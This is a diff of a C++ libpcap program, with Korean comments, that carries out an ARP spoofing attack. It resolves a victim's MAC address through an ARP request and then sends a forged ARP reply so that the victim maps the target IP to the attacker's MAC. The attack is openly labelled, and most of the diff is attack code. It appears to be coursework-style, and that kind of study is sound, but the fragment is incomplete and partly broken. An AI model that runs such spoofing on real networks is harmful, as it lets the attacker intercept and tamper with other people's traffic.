@@ -44,7 +44,7 @@ int main(int argc, char* argv[]){
     cout << "attacker mac 주소 "<< attacker_mac << endl;
 
     get_ip_address(interface, attacker_ip);
-    std::cout << "attacker ip 주소" << "IP Address: " << attacker_ip << std::endl;
+    std::cout << "attacker ip 주소" <<  attacker_ip << std::endl;
 
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t* handle = pcap_open_live(interface,BUFSIZ,1,1,errbuf);
@@ -55,27 +55,56 @@ int main(int argc, char* argv[]){
 	}    
 
     
-    strcpy(target_ip, argv[2]);
+    strcpy(sender_ip, argv[2]);
+    cout << "sender_ip " << sender_ip << endl;
+    strcpy(target_ip, argv[3]);
+    cout << "target_ip " << target_ip << endl;
     // target_mac 주소 알아오기 
-    request(handle,interface,broad_mac,attacker_mac,attacker_ip,empty_mac,target_ip,"request"); // target_mac 주소 알아오기 
-    reply(handle, interface, target_mac, target_ip);
+    // request(handle,interface,broad_mac,attacker_mac,attacker_ip,empty_mac,target_ip,"request"); // target_mac 주소 알아오기 
+    // reply(handle, interface, target_mac, target_ip);
     
-    std::cout <<"target_mac" <<  target_mac << std::endl;
+    //std::cout <<"target_mac" <<  target_mac << std::endl;
 
     // sender_mac 주소 알아오기 
-    request(handle,interface,broad_mac,attacker_mac,attacker_ip,empty_mac,sender_ip, "request");// sender_mac 주소 알아오기 
-    reply(handle, interface, sender_mac, sender_ip); 
 
-    // cout << "sender_mac" << endl;
+    request(handle,interface,broad_mac,attacker_mac,attacker_ip,empty_mac,sender_ip, "request");// sender_mac 주소 알아오기 
+    while (true) {
+    struct pcap_pkthdr* header;
+    const u_char* reply_packet;
+    int result = pcap_next_ex(handle, &header, &reply_packet);
+    if (result == 0) {
+        continue;
+    }
+    if (result == -1 || result == -2) {
+        break;
+    }
+
+    EthArpPacket* pArpPacket = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(reply_packet));
+
+    // ARP reply 패킷인지 확인 및 target IP 확인
+    if (ntohs(pArpPacket->eth_.type_) == EthHdr::Arp &&
+        ntohs(pArpPacket->arp_.op_) == ArpHdr::Reply &&
+        pArpPacket->arp_.tip_ == Ip(sender_ip)) {
+
+        // 받은 패킷에서 target MAC 주소 추출
+        strcpy(sender_mac, std::string(pArpPacket->arp_.smac_).c_str());
+        break;
+    }
+}
+
+    std::cout << "sender_mac" << sender_mac << std::endl;
+
 
     // ============= ARP 스푸핑 공격 수행하기 ====================== 
 
-    // target_mac 주소 알아오기 
-    request(handle,interface, target_mac, attacker_mac, sender_ip, target_mac,target_ip, "reply");// gateway_mac request (attacekr -> gateway)
+    // sender 속이기 
+    request(handle,interface,sender_mac,attacker_mac,target_ip,sender_mac,sender_ip, "reply");// gateway_mac request (attacekr -> gateway)
+    
+    // target 속이기 
+    //request(handle,interface, target_mac, attacker_mac, sender_ip, target_mac, target_ip, "reply");// gateway_mac request (attacekr -> gateway)
  
 
-    // target_mac 주소 알아오기 
-    request(handle,interface,,attacker_mac,attacker_ip, ,target_ip, "reply");// gateway_mac request (attacekr -> gateway)
+    
     
 
 
